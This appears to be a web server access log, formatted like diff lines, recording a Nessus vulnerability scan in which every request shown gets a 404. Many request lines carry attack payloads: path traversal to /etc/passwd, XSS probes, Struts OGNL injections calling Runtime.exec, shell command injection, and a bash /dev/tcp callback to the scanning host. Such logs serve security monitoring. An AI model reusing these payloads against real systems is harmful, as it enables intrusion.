+INFO:     198.82.145.75:42506 - "GET /login?redirects=10 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42522 - "GET /ControllerWeb/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42534 - "GET /app/ui/login.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42544 - "GET /ui/faces/Login.xhtml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42552 - "GET /index.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42562 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42568 - "GET /system.xml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42574 - "GET /getxml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42576 - "GET /login?redirects=10 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42582 - "GET http%3A//128.173.237.13%3A5550/authentication/login/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42598 - "GET /login.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42608 - "GET /CSCOnm/servlet/login/login.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42622 - "GET /login.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42624 - "GET /login?redirects=10 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42634 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42636 - "GET /cacti HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42640 - "GET /MM/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42642 - "GET /login.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42654 - "GET /nosuchfile-397244351-1418927322.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42656 - "GET /webapps/login/index.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42660 - "GET /webct/about.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42664 - "GET /WS2020/Default.aspx HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42676 - "GET /WS2021/Default.aspx HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42692 - "GET /WS2022/Default.aspx HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42706 - "GET /WS2023/Default.aspx HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42722 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42738 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42740 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42746 - "GET /cgi-mod/index.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42758 - "GET /cgi-bin/index.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42762 - "GET /header.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42774 - "GET /.htaccess.old HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42784 - "GET /.htaccess.bak HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42790 - "GET /.htaccess~ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42796 - "GET /.htaccess.copy HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42798 - "GET /.htaccess.tmp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42808 - "GET /..htaccess.swp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42814 - "GET /.htaccess.1 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42822 - "GET /.htaccess.~1~ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42826 - "GET /snmx-cgi/fxm.exe HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42834 - "GET /platform-ui/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42842 - "GET /management/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42846 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42856 - "GET /server-info HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42866 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42876 - "GET /kylin/api/admin/version HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42882 - "GET /unified-console.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42886 - "GET /api/v1/?format=api HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42898 - "GET /api/v1/?format=api HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42904 - "GET /system/login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42914 - "GET /system/login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42916 - "GET /courier/web/1000%40/wmLogin.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42932 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42934 - "GET /servlet/admin?category=server&method=listAll&Authorization=Digest+username%3D%22admin%22%2C+response%3D%22ae9f86d6beaa3f9ecb9a5b7e072a4138%22%2C+nonce%3D%222b089ba7985a883ab2eddcd3539a6c94%22%2C+realm%3D%22adminRealm%22%2C+uri%3D%22%2Fservlet%2Fadmin%22&service= HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     198.82.145.75:42960 - "POST /cgi-bin/mainfunction.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42990 - "GET /self_upgrade.html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     198.82.145.75:60594 - "GET /item.fts?href=%22%3E%3Cscript%3Ealert%28%22ftgate_44002.nasl%22%29%3C%2Fscript%3E%3B HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60608 - "GET /altercast/AlterCast?op=%3cscript%3ealert%28%22adobe_document_server_61.nasl%22%29%3c%2fscript%3e HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60610 - "GET /nul.dbm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60622 - "GET /mxhelp/cgi-bin/namazucgi?lang=/../../../../../../../../../../../../../boot.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60634 - "GET /index.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60648 - "GET /index.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60662 - "GET /web.config HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60670 - "GET /scripts/w3who.dll HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60684 - "GET /cgi-bin/filescan HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60696 - "GET /struts/webconsole.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60700 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60712 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60718 - "POST / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60726 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60742 - "GET /?class.classLoader.URLs[0]=struts_2_3_16_1_classloader_manipulation-1760714285 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60752 - "GET //%24%7B150682991%2B5%7D.action HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60754 - "GET //%24%7B%23w%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29.getWriter%28%29%2C%23w.print%28%27Nessus%20Response%3A%20%27%29%2C%23w.println%28%27struts_2_3_14_3_command_execution-150682991%27%29%2C%23w.flush%28%29%2C%23w.close%28%29%7D.action HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60770 - "GET //struts/webconsole.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60786 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60802 - "GET /.anydomain.test HTTP/1.0" 404 Not Found
+INFO:     198.82.145.75:60816 - "GET /etc/mnt_info.csv HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60832 - "POST /javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60844 - "GET /OvCgi/freeIPaddrs.ovpl?netnum=127.0.0.1&netmask=255.255.255.0&netid=127.0.0.1%20|%20id| HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60850 - "GET /setup/setup-/../../log.jsp?log=info&mode=asc&lines=10 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60860 - "GET /api/getServices?name[]=$(/bin/bash%20-c%20%22nslookup%20log4shell-generic-OqoOGTK0JJVQbUO8KzEpten.w.nessus.org) HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60864 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40286 - "GET /api/getServices?name[]=$(bash%20-c%20%22echo%20exploited_port[5550]by_nessus%20%3E/dev/tcp/198.82.145.75/45039") HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40298 - "GET /_mt/mt.cgi HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     198.82.145.75:40322 - "GET /version HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40330 - "GET /.%252e/.%252e/.%252e/.%252e/windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40338 - "GET /.%252e/.%252e/.%252e/.%252e/winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40344 - "GET /.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40358 - "GET /ifx/?LO=../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40374 - "GET /status.xsl. HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40376 - "POST /vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40378 - "POST /glpi/vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40390 - "POST /FormHandler.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40400 - "GET /cgi-bin/faqmanager.cgi?toc=/etc/passwd%00 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40412 - "POST http%3A//127.0.0.1/iControl/iControlPortal.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40416 - "GET /DB4Web/booberry.iso.vt.edu%3A23/foo HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40418 - "GET /CFIDE/administrator/index.cfm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40420 - "GET /backend/settings/oauth_adfs?hostname=128.173.237.13 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40428 - "GET /gui/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40436 - "GET /gui/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40450 - "GET /axis/DirectDownload.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40452 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40468 - "GET /_mt/mt.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40474 - "GET /admin.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40484 - "GET /administrator.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40494 - "GET /buglist.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40502 - "GET /cgi/mid.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40514 - "GET /cgi-bin/admin HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40522 - "GET /cgi-bin/admin.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40536 - "GET /cgi-bin/admin.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40550 - "GET /cgi-bin/administrator HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40558 - "GET /cgi-bin/administrator.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40562 - "GET /cgi-bin/agorn.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40574 - "GET /cgi-bin/bugreport.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40578 - "GET /cgi-bin/cart.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40588 - "GET /cgi-bin/clwarn.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40594 - "GET /cgi-bin/count.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40604 - "GET /cgi-bin/Count.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40610 - "GET /cgi-bin/faqmanager.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40622 - "GET /cgi-bin/FormHandler.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40636 - "GET /cgi-bin/FormMail.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40640 - "GET /cgi-bin/guestbook.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40654 - "GET /cgi-bin/help.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40668 - "GET /cgi-bin/hi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40674 - "GET /cgi-bin/index.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40686 - "GET /cgi-bin/index.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40688 - "GET /cgi-bin/index.sh HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40690 - "GET /cgi-bin/login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40702 - "GET /cgi-bin/login.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40712 - "GET /cgi-bin/mailit.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40724 - "GET /cgi-bin/mt/mt-check.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40732 - "GET /cgi-bin/mt/mt-load.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40746 - "GET /cgi-bin/mt-static/mt-check.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40762 - "GET /cgi-bin/mt-static/mt-load.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40766 - "GET /cgi-bin/ncbook/book.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40774 - "GET /cgi-bin/printenv HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40780 - "GET /cgi-bin/printenv.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40786 - "GET /cgi-bin/quickstore.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40794 - "GET /cgi-bin/search HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40808 - "GET /cgi-bin/search.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40816 - "GET /cgi-bin/search/search.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40828 - "GET /cgi-bin/status HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40842 - "GET /cgi-bin/status.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40848 - "GET /cgi-bin/test.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40858 - "GET /cgi-bin/test.sh HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40868 - "GET /cgi-bin/test-cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40874 - "GET /cgi-bin/upload.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40888 - "GET /cgi-bin/urlcount.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40902 - "GET /cgi-bin/viewcvs.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40904 - "GET /cgi-bin/wa HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40906 - "GET /cgi-bin/wa.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40916 - "GET /cgi-bin/wa.exe HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40926 - "GET /cgi-bin/whois.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40930 - "GET /cgi-bin-sdb/printenv HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40934 - "GET /cgi-mod/index.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40948 - "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40960 - "GET /cgi-sys/entropysearch.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40970 - "GET /index.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40986 - "GET /index.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41000 - "GET /index.sh HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41004 - "GET /nph-mr.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41006 - "GET /query.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41008 - "GET /session_login.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41010 - "GET /show_bug.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41024 - "GET /test HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41036 - "GET /test.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41042 - "GET /ucsm/isSamInstalled.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41044 - "GET /whois.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41056 - "GET /wp-login.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41060 - "GET /wwwadmin.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41064 - "GET /wwwboard.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41076 - "GET /xampp/cgi.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41078 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41082 - "GET /_mt/mt.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41088 - "GET /admin.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41092 - "GET /administrator.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41096 - "GET /buglist.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41112 - "GET /cgi/mid.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41124 - "GET /cgi-bin/admin HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41130 - "GET /cgi-bin/admin.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41140 - "GET /cgi-bin/admin.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41144 - "GET /cgi-bin/administrator HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41150 - "GET /cgi-bin/administrator.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41158 - "GET /cgi-bin/agorn.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41174 - "GET /cgi-bin/bugreport.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41182 - "GET /cgi-bin/cart.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41184 - "GET /cgi-bin/clwarn.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41190 - "GET /cgi-bin/count.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41204 - "GET /cgi-bin/Count.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41208 - "GET /cgi-bin/faqmanager.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41220 - "GET /cgi-bin/FormHandler.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41232 - "GET /cgi-bin/FormMail.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41236 - "GET /cgi-bin/guestbook.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41248 - "GET /cgi-bin/help.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41250 - "GET /cgi-bin/hi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41256 - "POST /cgi-bin/file_transfer.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41266 - "GET /cgi-bin/index.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41272 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41274 - "GET /cgi-bin/index.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41282 - "GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41296 - "GET /cgi-bin/index.sh HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41298 - "GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41300 - "GET /cgi-bin/login.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41316 - "GET /..%5Cpixfir~1%5Chow_to_login.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41330 - "GET /cgi-bin/mailit.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41338 - "GET /SiteScope/cgi/go.exe/SiteScope?page=eventLog&machine=&logName=System&account=administrator HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41344 - "GET /cgi-bin/mt/mt-check.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41360 - "GET /trace.axd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41368 - "GET /cgi-bin/mt/mt-load.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41376 - "GET /global.asa HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41378 - "GET /cgi-bin/mt-static/mt-check.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41394 - "GET /index.jsp%00x HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41408 - "GET /cgi-bin/mt-static/mt-load.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41414 - "GET /cgi-bin/ncbook/book.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41420 - "GET /cgi-bin/printenv HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41436 - "GET /cgi-bin/printenv.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41448 - "GET /cgi-bin/quickstore.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41452 - "GET /cgi-bin/search HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41462 - "GET /cgi-bin/search.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41468 - "GET /cgi-bin/search/search.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41480 - "GET /cgi-bin/status HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41490 - "GET /cgi-bin/status.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41502 - "GET /cgi-bin/test.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41504 - "GET /cgi-bin/test.sh HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41518 - "GET /cgi-bin/test-cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41528 - "GET /cgi-bin/upload.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41540 - "GET /cgi-bin/urlcount.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41552 - "GET /cgi-bin/viewcvs.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41564 - "GET /cgi-bin/wa HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41576 - "GET /cgi-bin/wa.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41590 - "GET /cgi-bin/wa.exe HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41598 - "GET /cgi-bin/whois.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41604 - "GET /cgi-bin-sdb/printenv HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41620 - "GET /cgi-mod/index.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41626 - "GET /rails_info/properties HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41630 - "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41632 - "GET /cgi-sys/entropysearch.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41648 - "GET /index.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41660 - "GET /index.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41676 - "GET /index.sh HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41690 - "GET /nph-mr.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41696 - "GET /query.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41702 - "GET /session_login.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41718 - "GET /show_bug.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41732 - "GET /test HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41736 - "GET /test.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41738 - "GET /ucsm/isSamInstalled.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41752 - "GET /whois.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41766 - "GET /wp-login.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41780 - "GET /wwwadmin.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41794 - "GET /wwwboard.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41802 - "GET /xampp/cgi.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41818 - "GET /admin.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:54690 - "GET /administrator.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:54694 - "GET /buglist.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:54726 - "GET /?tag=tenable-1840325260&method%3a%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23writer%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23writer.println(%23parameters.tag[0]),%23writer.flush(),%23writer.close HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:54738 - "GET /?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'id'})).start()} HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:54754 - "GET /?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23webroot%3d%23req.getSession().getServletContext().getRealPath('/'),%23resp%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23resp.print('At%201760714309%20Nessus%20found%20the%20path%20is%20'),%23resp.println(%23webroot),%23resp.flush(),%23resp.close()} HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:54722 - "GET //%28%23mem%3D%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29%3F%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.cmd%5B0%5D%29%3Aindex.xhtml?cmd=ping%20%2dc%203%20%2dp%206d636e32374633574f6b%20198.82.145.75 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:54706 - "GET %24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ping%20-c%203%20-p%20597044327857594a5f35%20198.82.145.75%27%29%29%7D// HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:54710 - "POST / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:54770 - "GET /?redirect:$%7b%23context%5b%27xwork.MethodAccessor.denyMethodExecution%27%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ping%20-c%203%20-p41446643675763715163%20198.82.145.75%27%29.getInputStream%28%29%29%7d HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:51572 - "GET /cgi/mid.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:51582 - "GET /?redirect:%24%7B57550614%2b16044095%7D HTTP/1.1" 404 Not Found
